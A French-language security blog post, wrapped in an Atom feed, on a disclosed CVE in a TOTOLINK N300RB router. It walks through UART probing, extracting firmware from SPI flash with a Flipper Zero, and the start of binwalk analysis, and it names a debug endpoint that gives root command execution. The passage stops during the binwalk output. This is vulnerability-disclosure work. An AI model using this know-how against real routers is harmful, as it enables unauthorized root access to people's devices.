<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://gohugo.io/" version="0.147.3">Hugo</generator><title>Reverse Engineering on 0x09</title><subtitle>Just Trying To Master Some 0ffs3c Skills...</subtitle><link href="https://0x09.dev/tags/Reverse-engineering/" rel="alternate" type="text/html" title="html"/><link href="https://0x09.dev/tags/Reverse-engineering/feed.xml" rel="self" type="application/atom+xml" title="atom"/><updated>2025-09-06T18:49:57+02:00</updated><author><name>Skander BELABED</name><email>belabedskander@gmail.com</email></author><id>https://0x09.dev/tags/Reverse-engineering/</id><entry><title>[CVE-2025-52089] Toto Découvre Une "Interface De Debug"</title><link href="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/" rel="alternate" type="text/html" hreflang="en"/><id>https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/</id><author><name>Skander BELABED</name></author><published>2025-07-10T20:18:18+02:00</published><updated>2025-08-30T19:30:52+02:00</updated><content type="html">
&lt;figure style="text-align: center;">&lt;img src="/img/toto/toto-door.png" style="width: 80%; height: 100%;" />&lt;/figure>
&lt;hr>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h1 id="tldr"
>
TL;DR
&lt;/h1>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#tldr" class="gblog-post__anchor clip flex align-center" aria-label="Anchor TL;DR" href="#tldr">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>Après l&amp;rsquo;extraction et l&amp;rsquo;analyse du firmware d&amp;rsquo;un routeur &lt;em>TOTOLINK N300RB&lt;/em>, une &lt;del>backdoor&lt;/del> interface de debug &lt;em>(/cgi/d.cgi)&lt;/em> permettant de lire des fichiers et d&amp;rsquo;exécuter des commandes de manière arbitraire en tant qu&amp;rsquo;utilisateur root a été découverte. Cette fonctionnalité peut être utilisée sous certaines conditions telles que l&amp;rsquo;activation d&amp;rsquo;une option spécifique dans la configuration du routeur ainsi que l&amp;rsquo;utilisation d&amp;rsquo;un secret.&lt;/p>
&lt;hr>
&lt;p>&lt;strong>SOMMAIRE&lt;/strong>
&lt;div class="gblog-toc gblog-toc__level--3">
&lt;nav id="TableOfContents">
&lt;ul>
&lt;li>&lt;a href="#tldr">TL;DR&lt;/a>&lt;/li>
&lt;li>&lt;a href="#introduction">Introduction&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#objectifs">Objectifs&lt;/a>&lt;/li>
&lt;li>&lt;a href="#sujet-n300rb">Sujet N300RB&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#une-première-autopsie">Une première autopsie&lt;/a>&lt;/li>
&lt;li>&lt;a href="#uart">UART&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#matériel-utilisé">Matériel utilisé&lt;/a>&lt;/li>
&lt;li>&lt;a href="#brancher-le-tout">Brancher le tout&lt;/a>&lt;/li>
&lt;li>&lt;a href="#impasse">Impasse&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#extraction-du-firmware-via-spi">Extraction du firmware via SPI&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#matériel-utilisé-1">Matériel utilisé&lt;/a>&lt;/li>
&lt;li>&lt;a href="#brancher-le-tout-1">Brancher le tout&lt;/a>&lt;/li>
&lt;li>&lt;a href="#une-deuxième-autopsie">Une deuxième autopsie&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#analyse-du-firmware">Analyse du firmware&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#run-binwalk">&amp;ldquo;run&amp;rdquo; Binwalk&lt;/a>&lt;/li>
&lt;li>&lt;a href="#mapping-du-code-source">Mapping du code source&lt;/a>&lt;/li>
&lt;li>&lt;a href="#un-air-de-déjà-vu">Un air de déjà vu&lt;/a>&lt;/li>
&lt;li>&lt;a href="#analyse-du-fichier">Analyse du fichier&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#une-option-pas-si-optionnelle">Une option pas si optionnelle&lt;/a>&lt;/li>
&lt;li>&lt;a href="#un--minerai-secret-en-paramètre">Un &amp;quot; &lt;del>minerai&lt;/del>&amp;quot; secret en paramètre&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#r00t">R00T&lt;/a>&lt;/li>
&lt;li>&lt;a href="#références">Références&lt;/a>&lt;/li>
&lt;/ul>
&lt;/nav>
&lt;hr />
&lt;/div>
&lt;/p>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h1 id="introduction"
>
Introduction
&lt;/h1>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#introduction" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Introduction" href="#introduction">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="objectifs"
>
Objectifs
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#objectifs" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Objectifs" href="#objectifs">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>&lt;strong>Dans un cadre d&amp;rsquo;apprentissage personnel&lt;/strong> sur la sécurité hardware, nous allons retracer les différentes étapes réalisées lors d&amp;rsquo;une l&amp;rsquo;analyse du firmware :&lt;/p>
&lt;ul>
&lt;li>Identification des protocoles de communication ou de debug&lt;/li>
&lt;li>Extraction du firmware du routeur&lt;/li>
&lt;li>Analyse du firmware et recherche de vulnérabilités&lt;/li>
&lt;/ul>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="sujet-n300rb"
>
Sujet N300RB
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#sujet-n300rb" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Sujet N300RB" href="#sujet-n300rb">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>La cible choisie pour cette démarche &lt;em>(de manière totalement hasardeuse)&lt;/em> est un routeur &lt;strong>TOTOLINK modèle N300RB&lt;/strong> avec un firmware &lt;strong>version 8.54&lt;/strong>.&lt;/p>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/router-box-1.png" style="width: 50%; height: 100%;" />&lt;/figure>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/web-portal-1.png" />&lt;figcaption style="text-align: center;">/login/login.cgi&lt;/figcaption>&lt;/figure>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h1 id="une-première-autopsie"
>
Une première autopsie
&lt;/h1>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#une-première-autopsie" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Une première autopsie" href="#une-premi%c3%a8re-autopsie">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>Une fois le routeur ouvert, la première étape consiste à essayer d&amp;rsquo;identifier un maximum de composants et d&amp;rsquo;interfaces pouvants être utiles dans l&amp;rsquo;accomplissement de nos objectifs.&lt;/p>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/router-components-1.png" />&lt;/figure>
&lt;p>En se basant sur une analyse visuelle, on peut déjà distinguer certains éléments intéressants :&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Element&lt;/th>
&lt;th>Utilité&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>UART&lt;/td>
&lt;td>Interface de debug pouvant potentiellement offrir directement un shell ou des fonctionnalités pouvant être détournées dans le but d&amp;rsquo;extraire le firmware&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>JTAG&lt;/td>
&lt;td>X&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Mémoire flash (MX25L3206E)&lt;/td>
&lt;td>Mémoire NOR pouvant potentiellement contenir le firmware du routeur&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h1 id="uart"
>
UART
&lt;/h1>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#uart" class="gblog-post__anchor clip flex align-center" aria-label="Anchor UART" href="#uart">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>Commençons donc par l&amp;rsquo;interface &lt;a
class="gblog-markdown__link"
href="https://fr.wikipedia.org/wiki/UART"
>UART&lt;/a>. L&amp;rsquo;objectif ici est de se connecter en &lt;em>UART&lt;/em> sur le routeur et analyser les informations ou fonctionnalités potentiellement présentes et qui dans certains cas peuvent nous mener à une extraction du firmware.&lt;/p>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="matériel-utilisé"
>
Matériel utilisé
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#matériel-utilisé" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Matériel utilisé" href="#mat%c3%a9riel-utilis%c3%a9">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Matériel&lt;/th>
&lt;th>Utilité&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Adaptateur USB-TTL(UART)&lt;/td>
&lt;td>Nous permettera d&amp;rsquo;établir une communication &lt;em>serial&lt;/em> entre notre machine et le routeur&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Multimètre&lt;/td>
&lt;td>Pour permettera d&amp;rsquo;identifier les quatres pins UART (VCC, GND, RX et TX)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/adaptateur-usb-ttl.jpeg" style="width: 50%; height: 100%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>Adaptateur USB-TTL FT232&lt;/figure>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/multimetre.jpeg" style="width: 50%; height: 100%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>Multimètre&lt;/figure>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="brancher-le-tout"
>
Brancher le tout
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#brancher-le-tout" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Brancher le tout" href="#brancher-le-tout">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>Après identification de chaque pin avec le multimètre, on se retrouve avec cet ordre de branchement :&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-txt" data-lang="txt">&lt;span class="line">&lt;span class="cl"> PC / Adaptateur USB-TTL Routeur
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ┌──────────────────────────┐ ┌────────────────┐
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │ │ │ │
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │ USB vers TTL │ │ UART TTL │
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │ │ │ (3.3V) │
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> └──────────────────────────┘ └────────────────┘
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │ │
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │ │
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ┌────────▼────────┐ ┌────────▼─────────┐
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │ GND (blanc) │──────────────&amp;gt; GND │
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├─────────────────┤ ├──────────────────┤
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │ TX (noir) │──────────────&amp;gt; RX │
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├─────────────────┤ ├──────────────────┤
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │ RX (jaune) │&amp;lt;────────────── TX │
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├─────────────────┤ ├──────────────────┤
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │ VCC │ │ Alimentation │
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> │ (non connecté) │ │ secteur │
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> └─────────────────┘ └──────────────────┘
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure style="text-align: center;">&lt;img src="/img/toto/uart-connected.jpeg" />&lt;figcaption style="text-align: center;">&lt;/figcaption>Connexion UART&lt;/figure>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="impasse"
>
Impasse
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#impasse" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Impasse" href="#impasse">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>Une fois le tout branché, on peut à présent lancer &lt;a
class="gblog-markdown__link"
href="https://github.com/npat-efault/picocom"
>picocom&lt;/a> en spécifiant le port &lt;em>serial&lt;/em> correspondant à notre adaptateur &lt;em>(dans notre cas /dev/ttyUSB0)&lt;/em> et tester dans un premier temps un des &lt;a
class="gblog-markdown__link"
href="https://fr.wikipedia.org/wiki/Baud_%28mesure%29"
>baud rate&lt;/a> les plus courants (-b 115200) :&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ picocom -b &lt;span class="m">115200&lt;/span> /dev/ttyUSB0 --logfile uart.log
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Decompressing...done
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CFE version 5.100.138.3 based on BBP 1.0.37 &lt;span class="k">for&lt;/span> BCM947XX &lt;span class="o">(&lt;/span>32bit,SP,LE&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Build Date: Mon May &lt;span class="m">2&lt;/span> 16:06:18 KST &lt;span class="m">2011&lt;/span> &lt;span class="o">(&lt;/span>bcm5357@localhost.localdomain&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Copyright &lt;span class="o">(&lt;/span>C&lt;span class="o">)&lt;/span> 2000-2008 Broadcom Corporation.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Init Arena
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Init Devs.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Boot partition &lt;span class="nv">size&lt;/span> &lt;span class="o">=&lt;/span> 131072&lt;span class="o">(&lt;/span>0x20000&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Found an ST compatible serial flash with &lt;span class="m">64&lt;/span> 64KB blocks&lt;span class="p">;&lt;/span> total size 4MB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">et0: Broadcom BCM47XX 10/100/1000 Mbps Ethernet Controller 5.100.138.3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CPU &lt;span class="nb">type&lt;/span> 0x19749: 300MHz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Tot mem: &lt;span class="m">16384&lt;/span> KBytes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Device eth0: hwaddr B8-55-10-C9-A4-E4, ipaddr 192.168.0.1, mask 255.255.255.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> gateway not set, nameserver not &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">====================================================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Product ID: zn300rb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Version : 8.54
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">====================================================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Check Magic RTMG: &lt;span class="o">[&lt;/span> OK &lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Check Product ID .. &lt;span class="o">(&lt;/span>boot:zn300rb&lt;span class="o">)&lt;/span>---&lt;span class="o">(&lt;/span>run:zn300rb&lt;span class="o">)&lt;/span> : &lt;span class="o">[&lt;/span> OK &lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Check ICV .. 7a5b8b3a:7a5b8b3a : &lt;span class="o">[&lt;/span> OK &lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">====================================================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=================================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">press magic key to change default setting ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LAN MAC : B8:55:10:C9:A4:E4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> WAN MAC : B8:55:10:C9:A4:E5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">iptables: No chain/target/match by that name
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Malgré la présence de plusieurs informations intéressantes, l&amp;rsquo;accès aux fonctionnalités du bootloader semble protégé par une &amp;ldquo;magic key&amp;rdquo; &lt;em>(probablement la combinaison de plusieurs touches)&lt;/em>. Passons donc au plan suivant.&lt;/p>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h1 id="extraction-du-firmware-via-spi"
>
Extraction du firmware via SPI
&lt;/h1>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#extraction-du-firmware-via-spi" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Extraction du firmware via SPI" href="#extraction-du-firmware-via-spi">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>La deuxième tentative d&amp;rsquo;extraction repose sur la liaison &lt;a
class="gblog-markdown__link"
href="https://fr.wikipedia.org/wiki/Serial_Peripheral_Interface#:~:text=Un%20analyseur%20de%20protocole%20SPI,%C3%A0%20certains%20mod%C3%A8les%20d%27oscilloscope."
>SPI&lt;/a>. L&amp;rsquo;objectif est simple &lt;em>(sur le papier)&lt;/em> : relier la mémoire flash du routeur à un programmeur et extraire les données qui y sont contenues.&lt;/p>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="matériel-utilisé-1"
>
Matériel utilisé
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#matériel-utilisé-1" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Matériel utilisé" href="#mat%c3%a9riel-utilis%c3%a9-1">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Matériel&lt;/th>
&lt;th>Utilité&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Flipper Zero&lt;/td>
&lt;td>Jouera le rôle du programmeur sachant qu&amp;rsquo;il supporte les liaisons SPI en utilisant ses pins GPIO&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Câble dupont&lt;/td>
&lt;td>Pour connecter le tout&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Une pince SOIC-8/SOP-8&lt;/td>
&lt;td>Un outil qui va nous permettre d&amp;rsquo;assurer un contact de manière simple avec la mémoire flash &lt;em>(sans dévoir déssouder le composant &lt;strong>*spoiler : on va devoir le faire&lt;/strong> *)&lt;/em>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/pince-sop8.jpeg" style="width: 50%; height: 100%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>Pince SOIC-8/SOP-8&lt;/figure>
&lt;p>La matériel en main, il faudra donc déterminer comment brancher tout cela ensemble. Un point de départ est la &lt;a
class="gblog-markdown__link"
href="https://docs.rs-online.com/5c85/0900766b814ac6f9.pdf"
>documentation&lt;/a> de la mémoire flash qui dans la majorité des cas identifie chaque pin SPI :&lt;/p>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/spi-vendor.png" />&lt;figcaption style="text-align: center;">&lt;a href="https://docs.rs-online.com/5c85/0900766b814ac6f9.pdf">https://docs.rs-online.com/5c85/0900766b814ac6f9.pdf&lt;/a>&lt;/figcaption>&lt;/figure>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="brancher-le-tout-1"
>
Brancher le tout
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#brancher-le-tout-1" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Brancher le tout" href="#brancher-le-tout-1">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>Comme mentionné précédement, on va utiliser un Flipper Zero durant ce processus et l&amp;rsquo;application utilisée est &lt;a
class="gblog-markdown__link"
href="https://lab.flipper.net/apps/spi_mem_manager"
>SPI Mem Manager&lt;/a>. Il faudra donc faire le parallèle entre les pins de la mémoire flash et les différents pins du Flipper Zero.&lt;/p>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/flipperzero-spi-pins-wiring.png" />&lt;figcaption style="text-align: center;">&lt;a href="https://lab.flipper.net/apps/spi_mem_manager">https://lab.flipper.net/apps/spi_mem_manager&lt;/a>&lt;/figcaption>&lt;/figure>
&lt;p>En se basant sur la documentation de &lt;em>SPI Mem Manager&lt;/em>, on obtient donc :&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>PIN FLIPPER ZERO&lt;/th>
&lt;th>MX25L3206E&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>MOSI&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>MOSO&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>CS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>5&lt;/td>
&lt;td>CLK&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>8&lt;/td>
&lt;td>GND&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>9&lt;/td>
&lt;td>3.3V&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/pince-flipperzero.jpeg" />&lt;figcaption style="text-align: center;">&lt;/figcaption>Branchement de la pince avec le Flipper Zero&lt;/figure>
&lt;blockquote class="gblog-hint note">
&lt;div class="gblog-hint__title flex align-center">&lt;i class="fa note" title="Note">&lt;/i>&lt;/div>
&lt;div class="gblog-hint__text">Il est généralement possible d&amp;rsquo;identifier le pin n°1 (CS#) sur le composant grâce à la présence d&amp;rsquo;une marque et plus précisément un point à côté de ce dernier.&lt;/div>
&lt;/blockquote>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="une-deuxième-autopsie"
>
Une deuxième autopsie
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#une-deuxième-autopsie" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Une deuxième autopsie" href="#une-deuxi%c3%a8me-autopsie">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>Il ne nous restera plus qu&amp;rsquo;à connecter la pince au composant et lancer la lecture depuis le Flipper Zero.&lt;/p>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/spi-read-1.png" />&lt;figcaption style="text-align: center;">&lt;/figcaption>Lecture de la mémoire flash&lt;/figure>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/spi-read-2.png" />&lt;figcaption style="text-align: center;">&lt;/figcaption>Taille du contenu extrait&lt;/figure>
&lt;blockquote class="gblog-hint note">
&lt;div class="gblog-hint__title flex align-center">&lt;i class="fa note" title="Note">&lt;/i>&lt;/div>
&lt;div class="gblog-hint__text">Pour réaliser cette connexion SPI, il est important que l&amp;rsquo;appareil cible ne soit pas alimenté &lt;em>(la mémoire flash sera alimentée elle seule grâce au pin VCC 3.3v)&lt;/em>. Dans le cas contraire, la mémoire flash sera naturellement sollicitée par le cpu et notre programmeur ne sera pas en mesure de communiquer avec elle.&lt;/div>
&lt;/blockquote>
&lt;blockquote class="gblog-hint note">
&lt;div class="gblog-hint__title flex align-center">&lt;i class="fa note" title="Note">&lt;/i>&lt;/div>
&lt;div class="gblog-hint__text">Durant les tests, l&amp;rsquo;opération ne s&amp;rsquo;est pas totalement déroulée comme prévue. En effet, un phénomène qui au final n&amp;rsquo;est pas si rare s&amp;rsquo;est produit&amp;hellip; un &lt;a
class="gblog-markdown__link"
href="https://en.wikipedia.org/wiki/Backfeeding"
>backfeeding ou backpowering&lt;/a>. En résumé, le fait de brancher la pince à la mémoire flash a provoqué l&amp;rsquo;alimentation de tout l&amp;rsquo;appareil, rendant ainsi la communication impossible &lt;em>(comme expliqué sur la précédente note)&lt;/em>. Une des solutions pour contourner ce problème a été de déssouder la mémoire flash, lire son contenu puis ressouder le composant.&lt;/div>
&lt;/blockquote>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h1 id="analyse-du-firmware"
>
Analyse du firmware
&lt;/h1>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#analyse-du-firmware" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Analyse du firmware" href="#analyse-du-firmware">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="run-binwalk"
>
&amp;ldquo;run&amp;rdquo; Binwalk
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#run-binwalk" class="gblog-post__anchor clip flex align-center" aria-label="Anchor &amp;ldquo;run&amp;rdquo; Binwalk" href="#run-binwalk">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>Une fois le firmware obtenu, on peut commencer son analyse. Un bon début serait avec l&amp;rsquo;outil &lt;a
class="gblog-markdown__link"
href="https://github.com/ReFirmLabs/binwalk"
>binwalk&lt;/a>.&lt;/p>
&lt;blockquote>
&lt;p>Binwalk est un outil permettant l&amp;rsquo;identification et l&amp;rsquo;extraction de fichiers ou données intégrés à d&amp;rsquo;autres.
Bien que son objectif principal soit l&amp;rsquo;analyse de firmwares, il prend en charge une grande variété de types de fichiers et de données.
&lt;cite>&lt;a
class="gblog-markdown__link"
href="https://github.com/ReFirmLabs/binwalk"
>https://github.com/ReFirmLabs/binwalk&lt;/a>&lt;/cite>&lt;/p>&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ binwalk -e firmware.bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /tmp/test/extractions/firmware.bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DECIMAL HEXADECIMAL DESCRIPTION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
